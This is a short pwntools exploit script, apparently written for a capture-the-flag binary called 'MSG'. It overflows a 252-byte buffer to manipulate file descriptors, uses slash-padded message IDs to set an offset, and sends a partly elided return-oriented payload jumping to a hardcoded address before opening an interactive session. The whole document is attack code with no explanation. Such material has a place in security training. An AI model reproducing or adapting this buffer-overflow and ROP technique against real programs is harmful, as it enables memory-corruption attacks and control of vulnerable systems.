from pwn import *

p = process("./MSG")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("a"*252+p32(0x00000002))
# open 3, close stderr(2)

print p.recv()
p.sendline("1")
print p.recvuntil("Msg ID : ")
msgId = p.recvline()
print msgId
print p.recv()
p.sendline("a"*252+p32(0x00000004))
# open 2, close 4


# ----- For offset ----- #
dummy = "This string is invalid string... : \n"
dummyLen = len(dummy)

p.recv()
p.sendline("3")
p.recvuntil("Input msg ID :")
p.sendline("/"*86)

p.recv()
p.sendline("3")
p.recvuntil("Input msg ID :")
p.sendline("/"*80)

print p.recv()
p.sendline("3")
print p.recvuntil('Input msg ID : ')
# --------------------- #

# ROP possible
payload = "..."
payload += p32(0x8048aa4)		# print 'msg : '
print len(payload)
p.sendline(payload)
print p.recv()

p.sendline('3')
print p.recvuntil("Input msg ID : ")
p.sendline(msgId)
p.recv()
p.interactive()
# Exploit!  

